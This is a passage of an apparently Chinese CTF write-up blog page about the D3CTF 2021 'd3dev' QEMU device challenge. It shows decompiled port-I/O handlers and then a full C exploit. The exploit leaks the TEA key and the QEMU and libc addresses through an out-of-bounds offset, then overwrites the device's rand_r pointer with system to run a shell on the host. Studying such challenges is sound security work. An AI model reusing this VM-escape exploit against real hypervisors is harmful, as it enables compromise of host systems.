+000012FE                 db ? ; undefined
+000012FF                 db ? ; undefined
+00001300 d3devState      ends
+</code></pre><p>根据上述的d3devState结构体来看，我们传进来的addr的值，可以分别读取</p>
+<pre><code>0x18: opaque + 0x12ec: opaque-&gt;key[3]
+0x00: opaque + 0x0ac0: opaque-&gt;memory_mode
+0x08: opaque + 0x0ac4: opaque-&gt;seek
+0x0c: opaque + 0x12e0: opaque-&gt;key[0]
+0x10: opaque + 0x12e4: opaque-&gt;key[1]
+0x14: opaque + 0x12e8: opaque-&gt;key[2]
+</code></pre><p>看W&amp;M的师傅写的WP，有一波操作可以把这里转换成switch结构，后续搞懂怎么弄补一下</p>
+<p><img src="../images/d3ctf-2021-qualifier-pwn-d3dev/2021-03-11-20-46-58.png" alt=""></p>
+<h4 id="d3dev-pmio-write"><a href="#d3dev-pmio-write" class="headerlink" title="d3dev_pmio_write"></a>d3dev_pmio_write</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// local variable allocation has failed, the output may be wrong!</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">d3dev_pmio_write</span><span class="params">(d3devState *opaque, hwaddr addr, <span class="keyword">uint64_t</span> val, <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">size</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">uint32_t</span> *v4; <span class="comment">// rbp</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( addr == <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( val &lt;= <span class="number">0x100</span> )</span><br><span class="line">      opaque-&gt;<span class="built_in">seek</span> = val;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( addr &gt; <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr == <span class="number">28</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      opaque-&gt;r_seed = val;</span><br><span class="line">      v4 = opaque-&gt;key;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">        *v4++ = ((__int64 (__fastcall *)(<span class="keyword">uint32_t</span> *, __int64, <span class="keyword">uint64_t</span>, _QWORD))opaque-&gt;rand_r)(</span><br><span class="line">                  &amp;opaque-&gt;r_seed,</span><br><span class="line">                  <span class="number">28L</span>L,</span><br><span class="line">                  val,</span><br><span class="line">                  *(_QWORD *)&amp;<span class="built_in">size</span>);</span><br><span class="line">      <span class="keyword">while</span> ( v4 != (<span class="keyword">uint32_t</span> *)&amp;opaque-&gt;rand_r );</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( addr )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr == <span class="number">4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_QWORD *)opaque-&gt;key = <span class="number">0L</span>L;</span><br><span class="line">      *(_QWORD *)&amp;opaque-&gt;key[<span class="number">2</span>] = <span class="number">0L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    opaque-&gt;memory_mode = val;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="编程访问pmio"><a href="#编程访问pmio" class="headerlink" title="编程访问pmio"></a>编程访问pmio</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">uint32_t</span> pmio_base=<span class="number">0xc040</span>; <span class="comment">// 0xc040 - 0xc05f</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">pmio_write</span><span class="params">(<span class="keyword">uint32_t</span> addr, <span class="keyword">uint32_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    outl(value,addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">pmio_read</span><span class="params">(<span class="keyword">uint32_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">uint32_t</span>)inl(addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Open and map I/O memory for the strng device</span></span><br><span class="line">    <span class="keyword">if</span> (iopl(<span class="number">3</span>) !=<span class="number">0</span> )</span><br><span class="line">        die(<span class="string">"I/O permission is not enough"</span>);</span><br><span class="line">        pmio_write(pmio_base+<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    pmio_write(pmio_base+<span class="number">4</span>,<span class="number">1</span>);</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MMIO_FILE <span class="meta-string">"/sys/devices/pci0000:00/0000:00:03.0/resource0"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PMIO_BASE 0xC040</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SYSTEM_PLT_OFFSET 0x2a6250</span></span><br><span class="line"><span class="keyword">void</span> * mmio_mem;</span><br><span class="line"><span class="keyword">void</span> * pmio_mem;</span><br><span class="line"><span class="keyword">void</span> * qemu_pie;</span><br><span class="line"><span class="keyword">uint32_t</span> key_list[<span class="number">4</span>];</span><br><span class="line"><span class="keyword">uint32_t</span> encrypto_key = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> system_plt = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_io</span><span class="params">()</span></span>&#123;</span><br><span class="line">        setbuf(<span class="built_in">stdin</span>,<span class="number">0</span>);</span><br><span class="line">        setbuf(<span class="built_in">stdout</span>,<span class="number">0</span>);</span><br><span class="line">        setbuf(<span class="built_in">stderr</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">tea_encrypt</span> <span class="params">(<span class="keyword">uint32_t</span>* v, <span class="keyword">uint32_t</span>* k)</span> </span>&#123;  </span><br><span class="line">    <span class="keyword">uint32_t</span> v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>], sum=<span class="number">0</span>, i;           <span class="comment">/* set up */</span>  </span><br><span class="line">    <span class="keyword">uint32_t</span> delta=<span class="number">0x9e3779b9</span>;                     <span class="comment">/* a key schedule constant */</span>  </span><br><span class="line">    <span class="keyword">uint32_t</span> k0=k[<span class="number">0</span>], k1=k[<span class="number">1</span>], k2=k[<span class="number">2</span>], k3=k[<span class="number">3</span>];   <span class="comment">/* cache key */</span>  </span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;                       <span class="comment">/* basic cycle start */</span>  </span><br><span class="line">        sum += delta;  </span><br><span class="line">        v0 += ((v1&lt;&lt;<span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;<span class="number">5</span>) + k1);  </span><br><span class="line">        v1 += ((v0&lt;&lt;<span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;<span class="number">5</span>) + k3);  </span><br><span class="line">    &#125;                                              <span class="comment">/* end cycle */</span>  </span><br><span class="line">    v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">tea_decrypt</span> <span class="params">(<span class="keyword">uint32_t</span>* v, <span class="keyword">uint32_t</span>* k)</span> </span>&#123;  </span><br><span class="line">    <span class="keyword">uint32_t</span> v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>], sum=<span class="number">0xC6EF3720</span>, i;  <span class="comment">/* set up */</span>  </span><br><span class="line">    <span class="keyword">uint32_t</span> delta=<span class="number">0x9e3779b9</span>;                     <span class="comment">/* a key schedule constant */</span>  </span><br><span class="line">    <span class="keyword">uint32_t</span> k0=k[<span class="number">0</span>], k1=k[<span class="number">1</span>], k2=k[<span class="number">2</span>], k3=k[<span class="number">3</span>];   <span class="comment">/* cache key */</span>  </span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;<span class="number">32</span>; i++) &#123;                         <span class="comment">/* basic cycle start */</span>  </span><br><span class="line">        v1 -= ((v0&lt;&lt;<span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;<span class="number">5</span>) + k3);  </span><br><span class="line">        v0 -= ((v1&lt;&lt;<span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;<span class="number">5</span>) + k1);  </span><br><span class="line">        sum -= delta;  </span><br><span class="line">    &#125;                                              <span class="comment">/* end cycle */</span>  </span><br><span class="line">    v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">pmio_read</span><span class="params">(<span class="keyword">uint32_t</span> offset)</span></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> return_data = (<span class="keyword">uint32_t</span>)inl(PMIO_BASE + offset);</span><br><span class="line">    <span class="keyword">return</span> return_data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pmio_write</span><span class="params">(<span class="keyword">uint32_t</span> offset,<span class="keyword">uint32_t</span> val)</span></span>&#123;</span><br><span class="line">    outl(val,PMIO_BASE + offset);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mmio_write_i32</span><span class="params">(<span class="keyword">uint32_t</span> offset,<span class="keyword">uint32_t</span> val)</span></span>&#123;</span><br><span class="line">    *(<span class="keyword">uint32_t</span> *)(mmio_mem + offset) = val;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mmio_write_i64</span><span class="params">(<span class="keyword">uint64_t</span> offset,<span class="keyword">uint64_t</span> val)</span></span>&#123;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(mmio_mem + offset) = val;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">mmio_read_i64</span><span class="params">(<span class="keyword">uint64_t</span> offset)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *(<span class="keyword">uint64_t</span> *)(mmio_mem + offset);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">mmio_read_i32</span><span class="params">(<span class="keyword">uint32_t</span> offset)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *(<span class="keyword">uint32_t</span> *)(mmio_mem + offset);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mmio_real_write</span><span class="params">(<span class="keyword">uint32_t</span> offset,<span class="keyword">uint32_t</span> val)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(((offset / <span class="number">0x4</span>) % <span class="number">2</span>) == <span class="number">0</span>)&#123;</span><br><span class="line">        pmio_write(offset,val);</span><br><span class="line">        pmio_write(offset,val);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        pmio_write(offset,val);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">modify_mmio_qword_offset</span><span class="params">(<span class="keyword">uint32_t</span> offset)</span></span>&#123;</span><br><span class="line">    pmio_write(<span class="number">0x8</span>,offset);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">get_mmio_qword_offset</span><span class="params">()</span></span>&#123;</span><br><span class="line">    encrypto_key = pmio_read(<span class="number">8</span>);</span><br><span class="line">    <span class="keyword">return</span> encrypto_key;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">debug</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"DEBUG!!!!!!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">read_num</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x30</span>];</span><br><span class="line">    <span class="built_in">memset</span>(buf,<span class="number">0</span>,<span class="number">0x30</span>);</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>,buf,<span class="number">0x30</span>);</span><br><span class="line">    <span class="keyword">return</span> atoi(buf);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_tea_key</span><span class="params">()</span></span>&#123;</span><br><span class="line">    key_list[<span class="number">0</span>] = pmio_read(<span class="number">0xc</span>);</span><br><span class="line">    key_list[<span class="number">1</span>] = pmio_read(<span class="number">0x10</span>);</span><br><span class="line">    key_list[<span class="number">2</span>] = pmio_read(<span class="number">0x14</span>);</span><br><span class="line">    key_list[<span class="number">3</span>] = pmio_read(<span class="number">0x18</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[Success] get tea key: %p %p %p %p\\n"</span>,key_list[<span class="number">0</span>],key_list[<span class="number">1</span>],key_list[<span class="number">2</span>],key_list[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">decode_tea</span><span class="params">(<span class="keyword">uint32_t</span> * values)</span></span>&#123;</span><br><span class="line">    tea_encrypt(values,key_list);<span class="comment">//tea crypto is reversible</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> * <span class="title">leak_qemu_pie</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[Info] mmio qword offset =&gt; %x\\n"</span>,get_mmio_qword_offset());</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"[Info] leak qemu pie..."</span>);</span><br><span class="line">    mmio_write_i32(<span class="number">8</span> * <span class="number">0</span>,<span class="number">0xdeadbeef</span>);</span><br><span class="line">    modify_mmio_qword_offset(<span class="number">18</span>);</span><br><span class="line">    <span class="keyword">uint32_t</span> val1 = mmio_read_i32(<span class="number">0x7F8</span>);</span><br><span class="line">    <span class="keyword">uint32_t</span> val2 = mmio_read_i32(<span class="number">0x7F8</span>);</span><br><span class="line">    <span class="keyword">uint32_t</span> list1[<span class="number">2</span>];</span><br><span class="line">    list1[<span class="number">0</span>] = val1;</span><br><span class="line">    list1[<span class="number">1</span>] = val2;</span><br><span class="line">    decode_tea(list1);</span><br><span class="line">    <span class="keyword">uint64_t</span> return_ptr = list1[<span class="number">0</span>] + ((<span class="keyword">uint64_t</span>)list1[<span class="number">1</span>] &lt;&lt; <span class="number">32</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%p %p\\n"</span>,list1[<span class="number">0</span>],list1[<span class="number">1</span>]);</span><br><span class="line">    return_ptr = ((<span class="keyword">uint64_t</span>) return_ptr) - (<span class="number">0x55d137928250</span> - <span class="number">0x55d1374a6000</span>);</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">void</span> *)return_ptr;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">calc_plt_function</span><span class="params">()</span></span>&#123;</span><br><span class="line">    system_plt = qemu_pie + <span class="number">0x2A6250</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[Info] system_plt =&gt; %p\\n"</span>,system_plt);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rce</span><span class="params">(<span class="keyword">char</span> * command)</span></span>&#123;</span><br><span class="line">    modify_mmio_qword_offset(<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">uint32_t</span> val1 = mmio_read_i32(<span class="number">0x8</span> * <span class="number">3</span>);</span><br><span class="line">    <span class="keyword">uint32_t</span> val2 = mmio_read_i32(<span class="number">0x8</span> * <span class="number">3</span>);</span><br><span class="line">    <span class="keyword">uint32_t</span> list1[<span class="number">2</span>];</span><br><span class="line">    list1[<span class="number">0</span>] = val1;</span><br><span class="line">    list1[<span class="number">1</span>] = val2;</span><br><span class="line">    decode_tea(list1);</span><br><span class="line">    <span class="keyword">uint64_t</span> libc_rand_r = list1[<span class="number">0</span>] + ((<span class="keyword">uint64_t</span>)list1[<span class="number">1</span>] &lt;&lt; <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> libc_system = libc_rand_r + (<span class="number">0x7f4b637c2410</span> - <span class="number">0x7f4b637b7eb0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[Info] rand_r_ptr  =&gt; %p\\n"</span>,libc_rand_r);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[Info] libc_system =&gt; %p\\n"</span>,libc_system);</span><br><span class="line"></span><br><span class="line">    val1 = system_plt % <span class="number">0x100000000</span>;</span><br><span class="line">    val2 = system_plt &gt;&gt; <span class="number">32</span>;</span><br><span class="line">    list1[<span class="number">0</span>] = val1;</span><br><span class="line">    list1[<span class="number">1</span>] = val2;</span><br><span class="line">    tea_decrypt(list1,key_list);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//uint32_t val = mmio_read_i64(0x8 * 3 + 4);</span></span><br><span class="line">    <span class="comment">//printf("val = %p\\n",val);</span></span><br><span class="line">    <span class="comment">//pmio_write(0x0,0xdeadcafe);</span></span><br><span class="line">    <span class="comment">//mmio_write_i64(8 * 3,0);</span></span><br><span class="line">    <span class="keyword">uint64_t</span> num = list1[<span class="number">0</span>] + ((<span class="keyword">uint64_t</span>)list1[<span class="number">1</span>] &lt;&lt; <span class="number">32</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"num =&gt; %p\\nlist1[0] = %p list1[1] = %p\\n"</span>,num,val1,val2);</span><br><span class="line">    mmio_write_i32(<span class="number">8</span> * <span class="number">0</span>,num);</span><br><span class="line">    mmio_write_i64(<span class="number">8</span> * <span class="number">3</span>,num);</span><br><span class="line">    mmio_write_i64(<span class="number">8</span> * <span class="number">3</span>,num);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    pmio_write(<span class="number">0x1c</span>,<span class="number">0x006873</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">exploit</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> mmio_fd = <span class="built_in">open</span>(MMIO_FILE,O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (mmio_fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"mmio_fd open failed"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>,<span class="number">0x1000</span>,PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (mmio_mem == MAP_FAILED)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"mmio_mem mmap failed"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[Info] mmio_mem =&gt; %p\\n"</span>,mmio_mem);</span><br><span class="line"></span><br><span class="line">    get_tea_key();</span><br><span class="line">    qemu_pie = leak_qemu_pie();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[Success] qemu_pie =&gt; %p\\n"</span>,qemu_pie);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"[Info] Calc functions offset"</span>);</span><br><span class="line">    calc_plt_function();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"[Info] Start rce!"</span>);</span><br><span class="line">    rce(<span class="string">"echo aaaa&gt;/flag"</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_data</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(iopl(<span class="number">3</span>) != <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[Error] IO permission denied!"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> * argv[])</span></span>&#123;</span><br><span class="line">        init_io();</span><br><span class="line">    init_data();</span><br><span class="line">    exploit();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul>
+<li><a href="https://ray-cp.github.io/archivers/qemu-pwn-Blizzard-CTF-2017-Strng-writeup">https://ray-cp.github.io/archivers/qemu-pwn-Blizzard-CTF-2017-Strng-writeup</a></li>
+<li><a href="https://mp.weixin.qq.com/s/HmrBddSEEE3EKM4BybcFoA">https://mp.weixin.qq.com/s/HmrBddSEEE3EKM4BybcFoA</a></li>
+<li>NU1L WP</li>
+</ul>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tags/">tags</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#描述"><span class="toc-number">1.</span> <span class="toc-text">描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#分析"><span class="toc-number">2.</span> <span class="toc-text">分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#MMIO"><span class="toc-number">2.1.</span> <span class="toc-text">MMIO</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#d3dev-mmio-read"><span class="toc-number">2.1.1.</span> <span class="toc-text">d3dev_mmio_read</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#d3dev-mmio-write"><span class="toc-number">2.1.2.</span> <span class="toc-text">d3dev_mmio_write</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#编程访问MMIO"><span class="toc-number">2.1.3.</span> <span class="toc-text">编程访问MMIO</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PMIO"><span class="toc-number">2.2.</span> <span class="toc-text">PMIO</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#d3dev-pmio-read"><span class="toc-number">2.2.1.</span> <span class="toc-text">d3dev_pmio_read</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#d3dev-pmio-write"><span class="toc-number">2.2.2.</span> <span class="toc-text">d3dev_pmio_write</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#编程访问pmio"><span class="toc-number">2.2.3.</span> <span class="toc-text">编程访问pmio</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用"><span class="toc-number">3.</span> <span class="toc-text">利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#小结"><span class="toc-number">4.</span> <span class="toc-text">小结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference"><span class="toc-number">5.</span> <span class="toc-text">Reference</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://1nv0k3r.fun/2021/04/15/d3ctf-2021-qualifier-pwn-d3dev/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://1nv0k3r.fun/2021/04/15/d3ctf-2021-qualifier-pwn-d3dev/&text=D3ctf-2021-Qualifier-Pwn-D3dev"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://1nv0k3r.fun/2021/04/15/d3ctf-2021-qualifier-pwn-d3dev/&title=D3ctf-2021-Qualifier-Pwn-D3dev"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://1nv0k3r.fun/2021/04/15/d3ctf-2021-qualifier-pwn-d3dev/&is_video=false&description=D3ctf-2021-Qualifier-Pwn-D3dev"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=D3ctf-2021-Qualifier-Pwn-D3dev&body=Check out this article: http://1nv0k3r.fun/2021/04/15/d3ctf-2021-qualifier-pwn-d3dev/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://1nv0k3r.fun/2021/04/15/d3ctf-2021-qualifier-pwn-d3dev/&title=D3ctf-2021-Qualifier-Pwn-D3dev"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://1nv0k3r.fun/2021/04/15/d3ctf-2021-qualifier-pwn-d3dev/&title=D3ctf-2021-Qualifier-Pwn-D3dev"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://1nv0k3r.fun/2021/04/15/d3ctf-2021-qualifier-pwn-d3dev/&title=D3ctf-2021-Qualifier-Pwn-D3dev"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://1nv0k3r.fun/2021/04/15/d3ctf-2021-qualifier-pwn-d3dev/&title=D3ctf-2021-Qualifier-Pwn-D3dev"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://1nv0k3r.fun/2021/04/15/d3ctf-2021-qualifier-pwn-d3dev/&name=D3ctf-2021-Qualifier-Pwn-D3dev&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2021 1nv0k3r
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tags/">tags</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
